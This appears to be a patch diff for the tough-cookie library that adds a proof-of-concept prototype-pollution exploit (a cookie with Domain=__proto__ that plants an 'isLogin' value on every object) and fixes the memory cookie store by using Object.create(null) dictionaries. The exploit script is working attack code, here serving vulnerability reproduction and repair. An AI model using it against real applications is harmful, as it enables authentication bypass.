@@ -1,0 +1,91 @@
+diff --git a/index.js b/index.js
+new file mode 100644
+index 0000000..80b27d8
+--- /dev/null
++++ b/index.js
+@@ -0,0 +1,30 @@
++async function main() {
++    try {
++        var tough = require("tough-cookie");
++        var cookiejar = new tough.CookieJar(undefined, { rejectPublicSuffixes: false });
++
++        await new Promise((resolve, reject) => {
++            cookiejar.setCookie(
++                "isLogin=polluted; Domain=__proto__; Path=/notauth",
++                "https://__proto__/admin",
++                { loose: true },
++                (err, cookie) => {
++                    if (err) {
++                        reject(err);
++                    } else {
++                        resolve(cookie);
++                    }
++                }
++            );
++        });
++
++        var obj = {};
++        console.log(obj["/notauth"]["isLogin"]);
++        console.log("EXPLOITED SUCCESSFULLY");
++    } catch (error) {
++        console.error("Error:", error);
++        console.log("EXPLOIT FAILED");
++    }
++}
++
++main();
+\ No newline at end of file
+diff --git a/lib/memstore.js b/lib/memstore.js
+index d2b915c..8c1fb90 100644
+--- a/lib/memstore.js
++++ b/lib/memstore.js
+@@ -28,6 +28,11 @@
+  * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+  * POSSIBILITY OF SUCH DAMAGE.
+  */
++
++/// Patch: Per the issue tracking notes and the patch changes,
++// in order to patch this vulnerability, we need to store the cookies
++// in a dictionary or creating an idx variable.
++// We will try this approach for starters.
+ 'use strict';
+ var Store = require('./store').Store;
+ var permuteDomain = require('./permuteDomain').permuteDomain;
+@@ -36,7 +41,7 @@ var util = require('util');
+ 
+ function MemoryCookieStore() {
+   Store.call(this);
+-  this.idx = {};
++  this.idx = Object.create(null);
+ }
+ util.inherits(MemoryCookieStore, Store);
+ exports.MemoryCookieStore = MemoryCookieStore;
+@@ -115,10 +120,10 @@ MemoryCookieStore.prototype.findCookies = function(domain, path, cb) {
+ 
+ MemoryCookieStore.prototype.putCookie = function(cookie, cb) {
+   if (!this.idx[cookie.domain]) {
+-    this.idx[cookie.domain] = {};
++    this.idx[cookie.domain] = Object.create(null);
+   }
+   if (!this.idx[cookie.domain][cookie.path]) {
+-    this.idx[cookie.domain][cookie.path] = {};
++    this.idx[cookie.domain][cookie.path] = Object.create(null);
+   }
+   this.idx[cookie.domain][cookie.path][cookie.key] = cookie;
+   cb(null);
+@@ -150,7 +155,7 @@ MemoryCookieStore.prototype.removeCookies = function(domain, path, cb) {
+ };
+ 
+ MemoryCookieStore.prototype.removeAllCookies = function(cb) {
+-  this.idx = {};
++  this.idx = Object.create(null);
+   return cb(null);
+ }
+ 
+@@ -178,4 +183,4 @@ MemoryCookieStore.prototype.getAllCookies = function(cb) {
+   });
+ 
+   cb(null, cookies);
+-};
++};
+\ No newline at end of file
